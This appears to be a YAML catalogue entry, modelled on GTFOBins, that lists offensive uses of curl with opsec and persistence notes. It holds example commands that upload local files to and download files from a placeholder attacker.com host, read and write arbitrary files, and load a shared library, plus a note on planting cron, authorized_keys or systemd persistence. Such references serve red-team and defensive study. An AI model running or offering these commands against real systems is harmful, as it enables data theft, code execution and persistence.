---
name: curl
capabilities:
- exec
- read
- write
- upload
- download
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  - File timestamps / inotify events on target paths
  - Outbound network traffic to attacker host
  notes: ''
persistence_potential: true
examples:
- id: download
  description: Fetch a remote file to disk.
  capabilities:
  - download
  command: curl http://attacker.com/path/to/input-file -o /path/to/output-file
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: curl file:///path/to/input-file
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: |-
    echo DATA >/path/to/temp-file
    curl file:///path/to/temp-file -o /path/to/output-file
- id: library-load
  description: Load an arbitrary shared library.
  capabilities:
  - exec
  command: curl --engine /path/to/lib.so x
- id: upload
  description: Send a local file to a remote host.
  capabilities:
  - upload
  command: curl -X POST --data-binary @/path/to/input-file http://attacker.com
- id: upload-2
  description: Send a local file to a remote host.
  capabilities:
  - upload
  command: curl -X POST --data-binary DATA http://attacker.com
- id: upload-3
  description: Send a local file to a remote host.
  capabilities:
  - upload
  command: curl gopher://attacker.com:12345/_DATA
  notes: Data will be `\r\n` terminated.
references:
- https://gtfobins.github.io/gtfobins/curl/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
